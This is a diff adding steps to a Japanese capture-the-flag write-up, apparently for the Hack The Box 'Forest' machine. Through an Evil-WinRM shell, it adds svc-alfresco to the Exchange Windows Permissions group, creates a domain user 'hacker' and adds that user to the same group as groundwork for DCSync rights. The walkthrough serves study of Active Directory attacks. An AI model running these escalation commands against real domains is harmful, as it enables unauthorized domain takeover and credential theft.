@@ -149,4 +149,39 @@ WriteDaclのabuseとして、ユーザにDCSyncの権限を与えるという攻
 ACCOUNT OPERATORSのメンバはEXCHANGE WINDOWS PERMISSIONSグループに対してGenericAll（なんでもできる）なので、EXCHANGE WINDOWS PERMISSIONSに新規ユーザを追加する。
 そしてその追加した新規ユーザにDCSync権限を与える。
 
+新規ユーザを作成する前に、まずsvc-alfresco自身をExcahnge Windows Permissionsグループに入れる：
+
+```
+*Evil-WinRM* PS C:\Users\svc-alfresco> net group "Exchange Windows Permissions" svc-alfresco /add
+The command completed successfully.
+```
+
+追加された事を確認：
+
+```
+*Evil-WinRM* PS C:\Users\svc-alfresco> whoami /groups
+
+GROUP INFORMATION
+-----------------
+
+Group Name                                 Type             SID                                           Attributes
+========================================== ================ ============================================= ==================================================
+Everyone                                   Well-known group S-1-1-0                                       Mandatory group, Enabled by default, Enabled group
+...
+HTB\Exchange Windows Permissions           Group            S-1-5-21-3072663084-364016917-1341370565-1121 Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10                                   Mandatory group, Enabled by default, Enabled group
+...
+```
+
+（"The command completed successfully."と表示されたのに追加されていない場合は、一旦^Cで切断して再度接続し直す）
+
+次に、hackerという新規ユーザをpasswordというパスワードで作成し、Exchange Windows Permissionsグループに追加する：
+
+```
+*Evil-WinRM* PS C:\Users\svc-alfresco> net user hacker password /add /domain
+The command completed successfully.
+*Evil-WinRM* PS C:\Users\svc-alfresco> net group "Exchange Windows Permissions" hacker /add
+The command completed successfully.
+```
+
 
